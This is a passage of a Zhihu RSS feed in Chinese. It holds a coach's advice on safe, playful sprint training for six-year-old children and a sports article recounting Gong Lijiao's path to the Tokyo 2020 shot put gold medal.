data-private-watermark-src=\"v2-1f6e03bacaa0a6f6ef6a5961346576d0\"></p>\n<p>作为父母，孩子的监护人，看着子女健康成长，衣食无忧，建功立业，结婚生子，是我们所愿所想。但培养他们良好的行为习惯，磨炼他们坚强的意志品质，遵守社会公德和法律，是父母的职责所在，此外，我们还希望在顺境中为其欢欣鼓舞，逆境中支持鼓励，给他们心中埋下一粒种子，为他们的梦想保驾护航。</p>\n<p>那么6岁的孩子究竟是否合适？在这些练习过程中又要注意什么呢？父母又要做什么呢？不要着急，请听我一一解答。</p>\n<h2>田径是一切运动的基础</h2>\n<p>请允许我\"王婆卖瓜\"一番，田径是运动之母，我们自打出生起，就跟田径运动分不开。走、跑、跳、投等，融入到我们的生活方方面面。<b>6岁的孩子即将进入发展速度的窗口期，因此在此时学习跑步，是一项非常明智的选择，对于提升孩子的整体素质，大有裨益。</b>不论是否今后从事体育项目，都会让孩子收益。当然如果今后发现天赋异禀，转成其他专业，相信田径带来的益处，绝对会让孩子受益匪浅。</p>\n<p><br></p>\n<p>俗话说的好，“兴趣是最好的老师”。孩子有了明确的偶像，有了学的兴趣，可谓有了“人和”。此时又是孩子练习短跑提升速度的窗口期，正所谓拥有了“天时”，那么这个“地利”，究竟如何获得呢？也就是我下面要讲的练什么，以及怎么练，以及练习过程中的注意事项。</p>\n<h2>身体锻炼一定要符合孩子身心发展</h2>\n<p>练什么怎么练，主要依据还是儿童在此时期的生理特点及心理特点来决定。孩子在6岁时，活泼爱动是天性，喜欢追赶打闹。你会发现带娃出去玩的时候，他们喜欢跑跑就停下，没休息多久马上就到处跑的情况反复发生。到底是为什么呢？简单来讲，<b>小朋友就好比一个封不上口的气球</b>，气打多了就会爆掉，因此能量存储有限。释放能量时，因为封不上口，“呼”的一下就全放走了，所以他们就容易累。气没了，再打气，不一会儿，他们又活力满满了。</p>\n<p>基于儿童身心发展特点，在给小朋友安排短跑练习时，有几个原则。</p>\n<blockquote>\n<b>第一，少量多次。</b><br><b>第二，循序渐进。</b><br><b>第三，娱乐性强。</b><br><b>第四，目标明确。</b>\n</blockquote>\n<h3><b>Rule NO.1 少量多次</b></h3>\n<p>小朋友耐力差，因此单次跑步的练习，距离一定不要长，控制好运动量。在每个单元的训练，合理规划好热身、练习时间、休息时间、放松，并且在休息时要注意补水和补充能量。多次，是因为儿童恢复能力好，可以在短暂休息后，再继续进行下一次练习。</p>\n<p>比如，我们在一堂40分钟的训练课中，可以给儿童安排10分钟的热身，热身时可进行慢跑或者做一些跟跑动有关的游戏，带着小朋友活动头、肩、髋、膝、踝各个关节，拉伸手臂和腿部肌肉，达到热身目的。25分钟的正课时间里，安排3组20米跑，组间休息1-2分钟，3组50米跑，组间休息2-3分钟。20米完成后，可增加休息时间，再进行50米练习。最后5分钟用来整理和放松，重点进行大、小腿的拉伸和背部的伸展放松。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8912ea1c3cc3782205098ceeff5ed43f_720w.jpg?rss\" data-rawwidth=\"1026\" data-rawheight=\"548\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8912ea1c3cc3782205098ceeff5ed43f\" data-watermark-src=\"v2-15b887ec5b1ae845b7a789035753b55f\" data-private-watermark-src=\"v2-50024f195a572935e12d543711ea183a\"></p>\n<h3>Rule NO.2 循序渐进</h3>\n<p>即使有了偶像，自己有浓厚的兴趣，也要注意循序渐进。苏炳添将近32岁，历时3届奥运之旅才终于冲进决赛，我们也不可能一天两天，一年两年，就能有质的飞跃。<b>尤其是在成绩大幅增长的时候，更应该注意保护，不能猛进。</b>我当年跳高受伤，就是因为在3个月从1.70米长了20厘米，身体其他方面素质没有跟上，太过激进，才会受伤影响了后续成绩增长的。因此，循序渐进，在孩子已经适应了前一单元的量和强度后，才可以再增加。</p>\n<p>例如，在前一次安排的主要内容里，小朋友在3组20米，3组50米已经可以完成后，在递进的练习中，可以通过增加量或者增加强度，以及同时增加量和强度的形式进行变换组合。</p>\n<p>PlanA 建议在保证运动强度不变的前提下，先提高运动量。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e96f88f39e8d11bd9c4cd81320a4dec_720w.jpg?rss\" data-rawwidth=\"1012\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2e96f88f39e8d11bd9c4cd81320a4dec\" data-watermark-src=\"v2-9a55b9b4834a383a6e86c1b909786f66\" data-private-watermark-src=\"v2-ae0c4494d14d53027caccc624df1b19e\"></p>\n<p>PlanB 完成A方案后，再在运动量不变的情况下，提高运动强度。因为小朋友没有经过系统训练，很难体会速度感，不了解90%的速度跑和100%全力冲刺的区别，因此我们可以通过缩短间歇时间来提高运动强度。但要注意20米和50米之间的间歇要保障，进行休息和补水。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ca3b8640965669f06b2c28993544ef21_720w.jpg?rss\" data-rawwidth=\"1010\" data-rawheight=\"572\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca3b8640965669f06b2c28993544ef21\" data-watermark-src=\"v2-91de07b77e77fdde00f2ab18a37733fa\" data-private-watermark-src=\"v2-1cda9f216ad02f5c1855b7c9f1a1bb70\"></p>\n<p>PlanC 运动量和强度分别提升且适应后，再同时提高。这一单元的训练，对成绩的提升尤为重要，同样需要注意在20米结束后，保证充足的休息时间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7ad885ef5346ea4e8e1e4543bcde23ac_720w.jpg?rss\" data-rawwidth=\"1028\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7ad885ef5346ea4e8e1e4543bcde23ac\" data-watermark-src=\"v2-9974145b54fd4a9aa7401b2024c33845\" data-private-watermark-src=\"v2-b75f1714d5343d75c1cdb736cb7c19d8\"></p>\n<p>根据儿童运动能力的提升和实际情况，组数、间歇时间，甚至是跑动距离都可以进行调整，这些计划和安排，都要因人而异，适时调整和改变。</p>\n<h3>Rule NO.3 娱乐性强</h3>\n<p>根据儿童心理发展特点，枯燥单一的练习，会让孩子失去兴趣。因此娱乐性就显得尤为重要。我们可以通过改变形式、方法，增加器材、设备等，提升孩子的兴趣，让看似枯燥的田径运动，也能发挥出它应有的魅力，让孩子在真正下定决心从事这项运动之前，仍然能够保有兴趣，让激情不被扼杀在摇篮里。<b>毕竟，真正的训练是非常苦的，每个奥运选手的成长之路，训练都是无比艰辛和刻苦，他们付出了常人无法想象的努力和心血。</b></p>\n<p>儿童在这个年龄，不仅仅是单一的直线跑。可以设定标志点，比如多种形式的折返跑、比如多人追逐跑（从前最常见的老鹰抓小鸡、撕名牌等）、配合道具的模仿救护员、消防员营救等多种形式，持球或其他物品的传递或亲子接力等，都可以融入进来，让孩子在提升速度练习的同时，觉得好玩并愿意坚持下去。</p>\n<p>去年冬天我带着小萌利用标志点进行了一些速度练习，可以跟各位分享几种方式方法。</p>\n<a href=\"https://www.zhihu.com/zvideo/1405368268631220224\">萌爸Kyle-标志点的速度练习</a><h3>Rule NO.4 目标明确</h3>\n<p>目标明确孩子执行力才更强。要有长期目标和短期目标。长期目标要有大的方向，尤其如果今后是奔着职业运动员发展的，要有一个大概的时间点，在此之前需要提升的专项素质和身体素质，都要达到要求才可以。短期目标要实际可操作付出努力后能达到，小到一次训练中孩子需要跑的距离，次数、时间等，都要有制定，这样孩子才会有动力，训练之后达成目标才会有成就感，也会激励他再接再厉继续前行。</p>\n<p>我们不能仅仅能看到的成绩的快慢。循序渐进，扎实走好每一步，有明确的目标，经过艰苦训练，才是苏炳添最终登上荣耀舞台的法宝。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-27c0964e1a9badd2229e15ee3a0e13f6_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"苏炳添的名字印刻在奥运会男子100米飞人大战的战场\" data-watermark=\"watermark\" data-original-src=\"v2-27c0964e1a9badd2229e15ee3a0e13f6\" data-watermark-src=\"v2-7910049c7652a94ec5b7cba374a8ed58\" data-private-watermark-src=\"v2-3cec0b19dc1f69b662064b823b73d546\"></p>\n<p>作为一名田径教练员，我也会根据不同项目，在不同时间，给队员安排具体的训练计划，让队员有目标，有侧重点，可操作，能执行。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3087386865d503c9f89cd2b85b6e039b_720w.jpg?rss\" data-rawwidth=\"970\" data-rawheight=\"1054\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3087386865d503c9f89cd2b85b6e039b\" data-watermark-src=\"v2-4083ba3c14aa26a1bb0ae887f21abffe\" data-private-watermark-src=\"v2-563ea294176285689e12f85c051dd35b\"></p>\n<h2>父母到底应该做什么？怎样支持孩子呢？</h2>\n<p>6岁的儿童还处在身体发展阶段，作为一名专业的田径教练员，<b>我强烈反对过早的竞技化</b>。因此，<b>不要把孩子送进体校，也不要过早确定短跑这个项目！</b></p>\n<p>如果家长有条件，可以先给孩子试着报一些体能培训班，当然有些培训机构以赚钱为目的，教练的能力参差不齐，有的会为了“效果”，过早的榨干孩子的潜能，而单一发展学生的某一身体素质。</p>\n<p>这时候，如果能送到有田径队的学校（大学、中学、小学皆可）里让孩子跟着活动，或送到更专业的地方就再好不过，<b>一定要跟教练说明来意，并表明观点：让孩子跟着玩，但不能像专业运动员一样练。</b>这么做的目的，一方面进行练习时会正规、系统；另一方面，可以让教练观察一下孩子在这方面是否有天赋。</p>\n<p>毕竟，竞技体育的选材都是非常严苛的。如果过早开发，可能会让孩子失去冲击更好成绩的机会；但如果孩子没有天赋，也好及时转型，避免时间、精力的浪费。但不论是否走专业路线，让孩子从事体育锻炼，适度练习对身体有很大好处，有益且有效。父母在孩子没有独立判断事情的能力之前，帮助孩子做最合理的决策，出谋划策，为他们的梦想护航，让他们向着正确的方向稳步前行。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-ba-kyle?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">萌爸Kyle</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">118 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/35348789?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特是不是人类体育史上最伟大的运动员？</a><br><a href=\"http://www.zhihu.com/question/20350644?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特能否被称作迄今为止最伟大的田径运动员？</a><br>\n","link":"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运会女子铅球决赛巩立姣夺得中国奥运田赛第一金，如何评价她的表现？","date":"2021-08-01 06:30:09","description":"\n<p>奥运冠军，拿来吧你！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-19a919a693318c9d3a223cf738f64154_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1364\" data-watermark=\"original\" data-original-src=\"v2-19a919a693318c9d3a223cf738f64154\" data-watermark-src=\"v2-89ad0fcb085bf8f26d12806b9b944666\" data-private-watermark-src=\"v2-b855dae886ecfddae987202f3b8e4a7c\"></p>\n<p>在东京<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25A5%25A5%25E8%25BF%2590%25E4%25BC%259A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">奥运会</a>田径项目<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/7/3/75308d5b/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">田赛</a>女子<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/9/c/94c57403/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">铅球</a>决赛的比赛中，中国选手<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25B7%25A9%25E7%25AB%258B%25E5%25A7%25A3\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">巩立姣</a>以20.58米的成绩夺得了决赛第一名，刷新个人最佳成绩的同时也为<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E4%25B8%25AD%25E5%259B%25BD%25E4%25BB%25A3%25E8%25A1%25A8%25E5%259B%25A2\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中国代表团</a>拿下本届奥运会第22枚金牌，这也是中国田径队在东京奥运会上的首块金牌。</p>\n<p>回顾她本场比赛：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a28e7c0b5ce63028f177a8ff0924ddf2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-a28e7c0b5ce63028f177a8ff0924ddf2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>出场，巩立姣发射爱心</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f540fbca74d4844d043cd6e9d1afeef5_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-f540fbca74d4844d043cd6e9d1afeef5\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第一投，19米95</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2c56d73d1cfa8fb839f74a9ecaaf6807_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-2c56d73d1cfa8fb839f74a9ecaaf6807\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第二投，主动犯规</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1dd4a645d000c2c4d25d87ec81f08fc1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-1dd4a645d000c2c4d25d87ec81f08fc1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第三投继续提升，投出19米98：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d56099cd9a9811f044364b03d5af4993_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-d56099cd9a9811f044364b03d5af4993\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第四投19米80状态回落</p>\n<p><img src=\"https://pic2.zhimg.com/v2-66a45c2c037c1e7b7fc2ea9192bb7c68_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-66a45c2c037c1e7b7fc2ea9192bb7c68\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第五投，一击致命！20米53直接打破个人最好成绩，提升了10厘米！几乎锁定金牌！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-34f8955289870802f7909c3e696d0f0a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-34f8955289870802f7909c3e696d0f0a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第六头继续提升！20米58！金牌，冠军！</p>\n<p>*******</p>\n<p>巩立姣曾说，每一届奥运会都像做梦一样，有的是美梦，有的是噩梦。而5年前的里约，无疑是后者。</p>\n<p>2016年5月，巩立姣投出20米43，刷新尘封七年之久的个人纪录，并创下当年的世界最好成绩。来到里约，她是女子铅球的头号夺金热门。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-334d3cb9e6b6eeb10688d5e36b1c86ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"379\" data-watermark=\"original\" data-original-src=\"v2-334d3cb9e6b6eeb10688d5e36b1c86ee\" data-watermark-src=\"v2-75d3360a37877f97fe58ae2027ae9f90\" data-private-watermark-src=\"v2-1689aff5c56355f232af07b6e7833caf\"></p>\n<p><br>决赛前夜，第三次参加奥运的巩立姣辗转反侧，脑子里不断浮现夺冠的场景，分不清是幻想还是梦境。然而第二天，迎接巩立姣的是残酷的现实，在奥运会的赛场上，她仿佛灵魂出窍。</p>\n<p>“投完第二投我就知道肯定没戏了。”巩立姣后来回忆，“第一次有这种感觉，我是人来疯，那场比赛想赶紧结束，每投一个球都是煎熬。”</p>\n<p>最后一投，巩立姣被匈牙利的马顿逆转，无缘领奖台。返回驻地的大巴上，巩立姣默默对自己说：“别做梦了，醒醒吧，都结束了，你是第四。”巩立姣把自己关在房间里，几天没吃东西，不愿意见人，离开奥运村时，她忍不住在众人面前嚎啕大哭。</p>\n<p>回国后，巩立姣始终不愿意面对冲金失利的现实，陷入抑郁的情绪中无法自拔，一度萌生退意。在德国外教克拉克的建议下，田径队为巩立姣请来了北京师范大学的心理老师，对她进行针对性心理辅导。</p>\n<p>人生中最难熬的时光，巩立姣还是挺了过来，引领她走出阴影的仍然是内心对冠军的渴望。当失意的2016年重新翻篇，巩立姣又一次上路，在三战钻石联赛中夺冠后，她发了一条朋友圈：“当你握紧双手，里面什么都没有；当你打开双手，世界就在你手中。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6c67a6ecb07006ca450107dbb2afef8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-6c67a6ecb07006ca450107dbb2afef8a\" data-watermark-src=\"v2-a4a9358616d9c56b9260975d593b4a41\" data-private-watermark-src=\"v2-887727d5e158eeb4901c5034a90fd563\"></p>\n<p>2017年8月，伦敦世锦赛，铅球决赛被安排在第六天。这是伦敦一周以来最冷的一天，秋风刺骨，大雨又为比赛设置了重重障碍。然而用巩立姣的话说，练到这个份上了，雨战又何妨？</p>\n<p>从第一投开始，巩立姣就确立了领先地位，除了里约奥运会冠军卡特在第三投超过19米之外，几乎没人能对巩立姣形成威胁。</p>\n<p>最终，巩立姣用19.94米的成绩杀死了最后的悬念。铅球刚一落地，巩立姣便兴奋地跳了起来，任由泪水和雨水在脸上流淌，对着转播镜头比出“六”的手势——这是她的第六次世锦赛——而观众席上的教练和队友早已把国旗挥舞了起来。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-99bcd9e813cf2cb3ef829b0f9cc8de0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-99bcd9e813cf2cb3ef829b0f9cc8de0c\" data-watermark-src=\"v2-b5be3ef93826fdb95bec5df019962512\" data-private-watermark-src=\"v2-f59cfd7b6d746471711a910c371e48e6\"></p>\n<p><br>对巩立姣来说，这个世界冠军拿得水到渠成，酣畅淋漓，也让中国女子铅球时隔24年再次站上世界之巅。“整个冬天都特别难过，还抑郁过一段时间。”巩立姣说，“其实从失败中走出来，回到正轨特别难，但自己还是挺了过来。因为我心里一直都有梦想，那就是站在世界最高领奖台上。我想，只要它还在，总有一天会实现的。”</p>\n<p>站上冠军领奖台，巩立姣哭着唱完国歌，过去十几年的训练画面像电影一样在脑海里过了一遍。‘没有什么比梦想更值得坚持’一直是她的座右铭，在国旗升起的那一刻，她对这句话的理解更深了，对她来说，跌倒后重新爬起来的过程和金牌同样重要。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-75291a00888d5c5166fe1ee0a6e7b3d1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"329\" data-watermark=\"original\" data-original-src=\"v2-75291a00888d5c5166fe1ee0a6e7b3d1\" data-watermark-src=\"v2-9c63db6af50ae1c89cb7430012dae42d\" data-private-watermark-src=\"v2-04d97448704f6c462edc73ddeec9c3f3\"></p>\n<p><br>2018年，从玉珍取代外教克拉克接管巩立姣，上任之后她给弟子布置了一个艰巨的任务——增重。“2015年我体重大约110公斤，当时教练觉得我脚下速度慢，想让我通过减重提爆发力。”巩立姣说，“不到一年我减了近15公斤，没想到减完之后，脚下的速度是上去了，手上的劲儿却没了。没办法，还得根据实际情况再增回来。一开始因为节食缩小的胃，为了增肥又得强行撑起来。那段时间害怕吃饭，每多吃一口都难受。”</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9c15be4113c2493bbff3c11d8b549f7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-9c15be4113c2493bbff3c11d8b549f7e\" data-watermark-src=\"v2-4fc5232190311c1be368189dcf356dad\" data-private-watermark-src=\"v2-8f64bf1abbe757217a818bbe10b2cb4f\"></p>\n<p>台上一分钟，台下十年功，粗略估计，巩立姣在训练中的投掷量达到几十万次。常年累月的高强度训练让巩立姣浑身是伤，每到阴雨天，右臂和左腿的关节就会隐隐作痛。为了减少伤病困扰，教练组借助更科学的手段，将巩立姣的训练精细化、数据化，重质量、轻数量，以前每天至少投200次，而现在一周也不过投200次。在投掷量减小的基础上，从玉珍把巩立姣的训练用球从6公斤改为8公斤。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ce4746599a6cf7a84f8379b1f4aa57ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"1332\" data-watermark=\"original\" data-original-src=\"v2-ce4746599a6cf7a84f8379b1f4aa57ad\" data-watermark-src=\"v2-98bcd10380b09497e1db3e3401253143\" data-private-watermark-src=\"v2-fddb18c70667a9d6295b68cc0e2ec6b5\"></p>\n<p>夺得伦敦世锦赛冠军后，巩立姣彻底打破了魔咒，进入一种独孤求败的状态，从2017年开始连续三年世界排名第一。2019年，巩立姣在参加的14项比赛中获得13枚金牌，其中包括在多哈世锦赛上完成卫冕，连续第三年赢下钻石联赛决赛。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-70b7f6dcfa6b38cb4e0bfcef93c8271a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-watermark=\"original\" data-original-src=\"v2-70b7f6dcfa6b38cb4e0bfcef93c8271a\" data-watermark-src=\"v2-2cf0ac8a1db537d5df933da3b34af29f\" data-private-watermark-src=\"v2-fdf5f4f819c8914677497cfe0630bd85\"></p>\n<p>唯一让巩立姣失望的是世锦赛的成绩，仅仅投出19.55米，仅比亚军托马斯-多德多了8厘米，创下史上最低夺冠成绩，在此之前世锦赛的最低夺冠成绩是1999年的19.85米。即便如此，巩立姣依然对东京奥运的前景保持乐观，“这个冠军对我也是一种鼓励，让我更加自信。状态这么差都能拿下冠军，等我恢复状态肯定就更没有问题了。”</p>\n<p>虽然过去几年罕有敌手，但是巩立姣丝毫不敢懈怠，一直在尝试调整自己的技术动作。在女子铅球的顶尖选手中，巩立姣的身高和体重并没有优势，她只能在技术层面追求极致。</p>\n<p>外教克拉克执教期间，巩立姣对步伐和步频进行了修正，同时加强了体能储备。到了东京周期的冲刺阶段，巩立姣的训练重点变成了调整滑步距离，让动作变得更舒展。为了把改动作的风险降到最低，田径队专门请来了美国的心理专家，调整巩立姣的心态。</p>\n<p>2019年12月，收到那枚迟到11年的奥运奖牌之后，巩立姣在北京体育大学进行了一场题为《冠军》演讲，她表示为了回应外界的质疑，夺取东京奥运会的金牌是她必须做出的回应。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-228cfbcd57a9a3129cde37a0be62d929_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"326\" data-watermark=\"original\" data-original-src=\"v2-228cfbcd57a9a3129cde37a0be62d929\" data-watermark-src=\"v2-c67005c5e8cb39c8cb40a61bf0cedd06\" data-private-watermark-src=\"v2-f7133710e7f63fe9d19b1882777d17f3\"></p>\n<p><br>就在巩立姣按部就班进行备战时，东京奥运会宣布延期，对任何一个老将而言，这都不是一个好消息。“当时那个月，我觉得整个人都垮掉了。”巩立姣回忆，“因为那一年我练得很好，2月份时成绩就突破了20米，那时候眼里只有奥运会。”</p>\n<p>备战计划的调整让巩立姣的身体亮起了红灯，左膝出现了严重的水肿，连走路都成了问题，只能坐着投球，她觉得天都塌了下来。在北京体育大学那间小宿舍里，巩立姣把事情想开了，“幸好不是取消，延期我也没事，虽然体力、体能可能会有所下降，但好事多磨，我又多了一些时间去准备，就更十拿九稳了，我会争取把最好的状态留到明年。”</p>\n<p><img src=\"https://pic1.zhimg.com/v2-559b3599f9ac2243ba058d79d246f421_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"1365\" data-watermark=\"original\" data-original-src=\"v2-559b3599f9ac2243ba058d79d246f421\" data-watermark-src=\"v2-4a9111b6bf769a3f172cae6cc57f7c1a\" data-private-watermark-src=\"v2-56d3b1c355ea3faea50d8c3c0b254893\"></p>\n<p>巩立姣没有食言，今年她在参加的7场比赛里，有两场的成绩都超过了20米。6月中旬在绍兴举办的奥运选拔赛中，巩立姣投出20.31米，创下本赛季世界最好成绩。十几天后，巩立姣在全运会选拔赛中更进一步，投出了20.39米，创下个人生涯第二好成绩。值得一提的是，她在这次比赛中有三次试投超过20米。“我感觉已经把奥运会金牌装兜里了，挂在这呢，一伸手就拿到了。”</p>\n<p>今年5月，奥委会官网对巩立姣进行了专题报道，文中提到，21这个数字对她有着特别的意义：奥运会延迟到2021年，今年是她从事铅球的第21个年头，而她的目标是突破21米。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0c8703afdd23adfcffb3caf503052f2a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"367\" data-watermark=\"original\" data-original-src=\"v2-0c8703afdd23adfcffb3caf503052f2a\" data-watermark-src=\"v2-814eeffe59297b3cd517c5b0b54118ff\" data-private-watermark-src=\"v2-fe6679891e8d26c3dcb04a26382ede60\"></p>\n<p><br>出征东京之前，巩立姣发了一条微博：“第四次参加奥运会，稳扎稳打，决胜东京，为国争光。”这一次，她终于做到了，在登上领奖台的那一刻，她的耳边一定响起了刘德华的那首歌：“等了好久终于等到今天，梦了好久终于把梦实现。”</p>\n<p>********</p>\n<p>卑微的贴二维码求关注我们的小破号：后厂村体工队</p>\n<p><img src=\"https://pic2.zhimg.com/v2-45c3be1acccc90aaca7c5418d388aa34_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"346\" data-watermark=\"original\" data-original-src=\"v2-45c3be1acccc90aaca7c5418d388aa34\" data-watermark-src=\"v2-e810e32a9b273de5249d0fa76d8daca8\" data-private-watermark-src=\"v2-16c4bcdabd4ea616588c61802f8468f1\" data-qrcode-value=\"http://weixin.qq.com/r/rnVCWl3EYgAdrRk59yC8\" data-tags=\"qrcode\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yi-ti-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">网易体育</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">201 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475915462?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会体操女子个人全能决赛唐茜靖第 7 芦玉菲第 18 ？</a><br><a href=\"http://www.zhihu.com/question/477141545?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会乒乓球女团半决赛中国 3:0 胜德国晋级决赛，将战日本？</a><br>\n","link":"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价手游《俄罗斯方块环游记》？","date":"2021-07-31 15:30:07","description":"\n<p><b>大家好，我是《俄罗斯方块环游记》的制作人Poly，感谢@知乎游戏 